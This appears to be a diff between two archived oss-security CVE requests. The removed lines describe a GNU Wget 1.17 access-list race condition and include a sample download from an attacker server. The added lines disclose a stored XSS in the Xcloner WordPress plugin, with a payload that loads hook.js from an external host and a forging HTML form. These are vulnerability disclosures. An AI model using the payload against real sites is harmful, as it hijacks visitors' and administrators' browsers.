@@ -1,134 +1,48 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/08/12/2
-Message-ID: <F1719FA0B756A0418954A40BEB1A013849B1062B@BRN1WNEXMBX01.vcorp.ad.vrsn.com>
-Date: Thu, 11 Aug 2016 21:11:56 +0000
-From: "Misra, Deapesh" <dmisra@...isign.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/07/27/2
+Message-ID: <3626D6E697A150459C44C0E5D8D8D00E0DBE8BDF@EX02.corp.qihoo.net>
+Date: Wed, 27 Jul 2016 02:35:46 +0000
+From: limingxing <limingxing@....cn>
 To: "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>
-CC: "dawid@...alhackers.com" <dawid@...alhackers.com>, "bug-wget@....org" <bug-wget@....org>
-Subject: CVE Request - Gnu Wget 1.17 - Design Error Vulnerability
+Subject: CVE request : a stored XSS in Xcloner for wordpress
 Content-Type: text/plain; charset=utf-8
 
-Hi,
+Hi
 
-------------------
-- Background -
-------------------
+     I found a stored XSS in Xcloner for wordpress.  The XSS filter can 
+be bypass.
 
-Here at iDefense, Verisign Inc, we have a Vulnerability Contributor Program (VCP) where we buy vulnerabilities. 
+     Here is the plugin page
+     https://wordpress.org/plugins/xcloner-backup-and-restore/
 
-Recently, security researcher Dawid Golunski sold us an interesting vulnerability within Wget. We asked Red Hat (secalert at redhat dot com) if they would help us with the co-ordination (patching, disclosure, etc) of this vulnerability. Once they graciously accepted, we discussed the vulnerability with them. After their initial triage, Red Hat recommended that we publicly post the details of this vulnerability to this mailing list for further discussion and hence this email.
+     PoC
 
-----------
-- Title -
-----------
+     In the "Corn setting" page(URL is 
+"http://<target>/wordpress/wp-admin/plugins.php?page=xcloner_show&option=com_cloner&task=config"), 
+set the "Backup name" (corn_bname) like 
+"1%22%3E%3Cscript+src%3Dhttp%3A%2F%2F172.16.146.128%3A3000%2Fhook.js+on"
 
-Wget Race Condition Recursive Download Accesslist Race Condition Vulnerability
-
-------------------------
--  Vulnerable Version  -
-------------------------
-
-GNU Wget <= 1.17       Race Condition / Access-list Bypass
-
--------------------
--  Vulnerability  -
--------------------
-
-When wget is used in recursive/mirroring mode, according to the manual it can take the following access list options:
-
-"Recursive Accept/Reject Options:
-  -A acclist --accept acclist
-  -R rejlist --reject rejlist
-
-Specify comma-separated lists of file name suffixes or patterns to accept or reject. Note that if any of the wildcard characters, *, ?, [ or ], appear in an element of acclist or rejlist, it will be treated as a pattern, rather than a suffix."
-
-These can for example be used to only download JPG images. 
-
-The vulnerability surfaces when wget is used to download a single file with recursive option (-r / -m) and an access list ( -A ), wget only applies the list at the end of the download process. 
-
-This can be observed on the output below:
-
-	# wget -r -nH -A '*.jpg' http://attackers-server/test.php
-	Resolving attackers-server... 192.168.57.1
-	Connecting to attackers-server|192.168.57.1|:80... connected.
-	HTTP request sent, awaiting response... 200 OK
-	Length: unspecified [text/plain]
-	Saving to: 'test.php'
-
-	15:05:46 (27.3 B/s) - 'test.php' saved [52]
-
-	Removing test.php since it should be rejected.
-
-	FINISHED
+     <html>
+         <form 
+action="http://<target>/wordpress/wp-admin/plugins.php?page=xcloner_show&option=com_cloner&task=config" 
+method="post">
+             <input type="hidden" name="cron_bname" 
+value="1%22%3E%3Cscript+src%3Dhttp%3A%2F%2F172.16.146.128%3A3000%2Fhook.js+on" 
+/>
+             <input type="submit" name="submit">
+         </form>
+     </html>
 
 
-Although the file get successfully deleted in the end, this creates a race condition situation as an attacker who has control over the URL, could slow down the download process so that he had a chance to make use of the malicious file before it gets deleted.
+     Fix way
+     Update to version 3.1.5
+
+     Change
+
+     https://plugins.trac.wordpress.org/changeset/1456784
 
 
-It is very easy for an attacker to win this race as the file only gets deleted after the HTTP connection is terminated. He can therefore keep the connection open as long as necessary to make use of the uploaded file.  Below is proof of concept exploit that demonstrates this technique.  
+     Could you assign a CVE ID for it?
 
-
-----------------------
--  Proof of Concept  -
-----------------------
-
-< REDACTED BY iDefense FOR THE TIME BEING >
-
--------------------
--  Discussion  -
--------------------
-
->From the wget manual:
-
-https://access.redhat.com/security/team/contact
-
-> Finally, it's worth noting that the accept/reject lists are matched twice against downloaded files: once against the URL's filename portion, to determine if the file should be downloaded in the first place; then, after it has been accepted and successfully downloaded, the local file's name is also checked against the accept/reject lists to see if it should be removed. The rationale was that, since '.htm' and '.html' files are always downloaded regardless of accept/reject rules, they should be removed after being downloaded and scanned for links, if they did match the accept/reject lists. However, this can lead to unexpected results, since the local filenames can differ from the original URL filenames in the following ways, all of which can change whether an accept/reject rule matches: 
-
-
-and from the source code, in file recur.c:
-
-      if (file
-          && (opt.delete_after
-              || opt.spider /* opt.recursive is implicitely true */
-              || !acceptable (file)))
-        {
-          /* Either --delete-after was specified, or we loaded this
-             (otherwise unneeded because of --spider or rejected by -R)
-             HTML file just to harvest its hyperlinks -- in either case,
-             delete the local file. */
-          DEBUGP (("Removing file due to %s in recursive_retrieve():\n",
-                   opt.delete_after ? "--delete-after" :
-                   (opt.spider ? "--spider" :
-                    "recursive rejection criteria")));
-          logprintf (LOG_VERBOSE,
-                     (opt.delete_after || opt.spider
-                      ? _("Removing %s.\n")
-                      : _("Removing %s since it should be rejected.\n")),
-                     file);
-          if (unlink (file))
-            logprintf (LOG_NOTQUIET, "unlink: %s\n", strerror (errno));
-          logputs (LOG_VERBOSE, "\n");
-          register_delete_file (file);
-        }
-
-
-it is evident that the accept/reject rule is applied only after the download. This seems to be a design decision which has a security aspect to it. As discussed above, 
-   - an attacker can ensure that the files which were not meant to be downloaded are downloaded to the location on the victim server (which should be a publicly accessible location) 
-   - the attacker can keep the connection open, even if the file/s have been downloaded on the victim server
-   - the attacker can then access these files OR use them in a separate attack
-   - the victim server's security is impacted since the developer/administrator was never warned explicitly that 'rejected files' can have a transient life on the victim server
-
-
-It looks like the design for wget needs to be changed so that the file it downloads to 'recursively search' through is not saved in a location which is accessible by the attacker. Additionally the documentation needs to be enhanced with the explicit mention of the 'transient nature' of the files which are to be rejected.
-
-
-We welcome your comments/suggestions.
-
-thanks,
-
-Deapesh.
-iDefense Labs, Verisign Inc.
-http://www.verisign.com/en_US/security-services/security-intelligence/vulnerability-reports/index.xhtml
-
-PS: I hope the maintainer Giuseppe Scrivano gets to see this via the bug-wget list I have CC-ed.
-
+Chen Ruiqi
+Codesafe Team
